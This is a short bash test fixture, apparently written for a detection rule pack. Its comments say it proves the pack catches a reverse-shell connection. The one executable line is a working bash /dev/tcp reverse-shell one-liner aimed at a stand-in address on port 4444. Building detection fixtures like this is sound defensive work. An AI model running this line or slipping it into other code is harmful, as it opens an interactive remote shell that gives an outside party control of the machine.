#!/bin/bash
# SYNTHETIC fixture — interactive reverse shell (bash /dev/tcp one-liner).
# Payload shape sourced from the reverse-shell-generator (https://www.revshells.com/).
# Used to prove the reverse_shells pack detects C2 establishment. NOT live malware.
bash -i >& /dev/tcp/203.0.113.5/4444 0>&1
